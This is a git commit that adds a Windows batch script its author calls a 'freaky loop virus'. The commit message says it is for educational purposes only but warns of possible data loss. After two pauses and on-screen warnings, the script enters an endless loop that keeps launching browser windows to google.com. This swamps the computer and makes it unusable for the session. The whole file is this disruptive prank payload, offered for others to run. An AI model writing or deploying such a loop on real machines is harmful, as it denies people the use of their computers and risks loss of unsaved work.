10485bf286a903d090a3a42ff13d0bdfd13687d3
Anand prabhakar <anandprabhakar0507@gmail.com>
2018-05-11 15:04:10 +0530

    Add files via upload
    this respiratory consist of batch script  code and executable for ms-dos which opens unlimited tab as your pc can and makes your pc inactive for current session...
    Thisis for educational purpose onlY!!   and run only in safe mode otherwise it can cause data loss....but if you found some problem in running it then you can email me at:anandprabhakar0507@gmail.com..

---
+++ anand freaky loop virus  to open unlimited tabs.bat
@@ -0,0 +1,17 @@
+@echo off
+color 0a
+TITLE ANAND PRABHAKAR FREAKY INTERNET VIRUS
+echo this is a freaky virus by anand that opens up unlimited tabs and windows of web browser in loop
+echo pls exit this program if you do not want your computer 
+echo get  stucked off..
+echo loading.
+pause
+color ec
+echo loading..
+echo loading completed. Ready to launch?
+echo click enter...
+
+pause
+:AD
+start http://www.google.com;]
+goto AD
